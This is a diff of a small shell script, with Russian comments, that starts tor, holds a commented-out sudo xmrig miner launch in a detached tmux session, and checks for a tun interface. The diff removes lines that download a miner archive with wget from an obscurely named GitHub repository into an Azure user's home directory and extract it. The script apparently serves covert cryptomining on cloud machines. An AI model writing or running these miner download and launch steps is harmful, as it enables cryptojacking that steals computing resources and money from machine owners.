@@ -3,11 +3,6 @@
 sudo systemctl start tor
 #tmux new -ds servak sudo ./xmrig
 
-cd home/azureuser
-wget https://github.com/samuraifinseev/jkldashdjasopiwqeohbvxc89123nbjkczxvsdi/raw/main/mo_miner010824.tar.xz -P /home/azureuser
-tar -xf mo_miner010824.tar.xz
-
-
 ### НОВАЯ ФИЧА ДЛЯ ПРОВЕРКИ ТЮНА
 if ip add | grep -q tun; then
     echo "Интерфейс tun присутствует"
